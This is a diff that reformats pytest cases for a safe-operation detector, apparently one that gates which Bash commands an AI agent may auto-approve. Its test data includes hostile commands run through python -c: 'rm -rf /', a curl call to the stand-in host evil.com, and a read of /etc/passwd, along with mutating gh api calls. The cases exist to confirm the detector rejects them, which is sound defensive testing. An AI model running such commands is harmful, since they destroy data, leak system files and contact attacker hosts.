@@ -512,12 +512,15 @@ class TestSafeOperationDetector:
 
     # Security: python -c should NOT be auto-approved (arbitrary code execution)
 
-    @pytest.mark.parametrize("command", [
-        "python -c 'import os; os.system(\"rm -rf /\")'",
-        "python3 -c 'import subprocess; subprocess.run([\"curl\", \"evil.com\"])'",
-        "python -c 'print(open(\"/etc/passwd\").read())'",
-        "python3 -c 'import sys; print(sys.version)'",
-    ])
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "python -c 'import os; os.system(\"rm -rf /\")'",
+            'python3 -c \'import subprocess; subprocess.run(["curl", "evil.com"])\'',
+            "python -c 'print(open(\"/etc/passwd\").read())'",
+            "python3 -c 'import sys; print(sys.version)'",
+        ],
+    )
     def test_should_not_approve_python_dash_c(self, detector, command):
         """python -c allows arbitrary code execution and must NOT be Tier 2 safe."""
         is_safe, _ = detector.is_safe("Bash", {"command": command})
@@ -531,25 +534,31 @@ class TestSafeOperationDetector:
 
     # Security: gh api should only match read-only (GET) calls
 
-    @pytest.mark.parametrize("command", [
-        "gh api repos/owner/repo/pulls",
-        "gh api /repos/owner/repo/issues",
-        "gh api repos/owner/repo/actions/runs",
-    ])
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "gh api repos/owner/repo/pulls",
+            "gh api /repos/owner/repo/issues",
+            "gh api repos/owner/repo/actions/runs",
+        ],
+    )
     def test_should_approve_gh_api_get_requests(self, detector, command):
         """gh api without mutation flags should be approved (defaults to GET)."""
         is_safe, category = detector.is_safe("Bash", {"command": command})
         assert is_safe is True, f"GET-only gh api should be safe: {command}"
         assert "read-only info command" in category
 
-    @pytest.mark.parametrize("command", [
-        "gh api repos/owner/repo/pulls -X POST -f title='test'",
-        "gh api repos/owner/repo/issues -X DELETE",
-        "gh api repos/owner/repo/git/refs -X PUT",
-        "gh api repos/owner/repo/pulls -X PATCH -f state=closed",
-        "gh api repos/owner/repo/pulls --method POST -f title='test'",
-        "gh api repos/owner/repo/issues --method DELETE",
-    ])
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "gh api repos/owner/repo/pulls -X POST -f title='test'",
+            "gh api repos/owner/repo/issues -X DELETE",
+            "gh api repos/owner/repo/git/refs -X PUT",
+            "gh api repos/owner/repo/pulls -X PATCH -f state=closed",
+            "gh api repos/owner/repo/pulls --method POST -f title='test'",
+            "gh api repos/owner/repo/issues --method DELETE",
+        ],
+    )
     def test_should_not_approve_gh_api_mutating_requests(self, detector, command):
         """gh api with POST/PUT/PATCH/DELETE must NOT be Tier 2 safe."""
         is_safe, _ = detector.is_safe("Bash", {"command": command})
